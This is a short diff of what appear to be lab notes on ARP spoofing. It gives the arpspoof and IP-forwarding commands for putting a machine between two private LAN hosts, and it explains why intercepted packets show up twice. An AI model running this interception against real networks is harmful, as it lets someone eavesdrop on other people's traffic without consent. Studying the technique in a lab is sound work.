@@ -1,0 +1,5 @@
+# echo 1 > /proc/sys/net/ipv4/ip_forward
+$ sudo arpspoof -t 192.168.84.64 -r 192.168.84.44
+# echo 0 > /proc/sys/net/ipv4/ip_forward
+
+There are two sets of packets because the arpspoof ensures we receive the packet sent by 192.168.84.64, because we claim we are 192.168.84.44. Due to ip forwarding we forward the received packet to the intended destination (the non spoofed 192.168.84.44), thus each received packet is also forwarded, meaning we get a set of two packets.
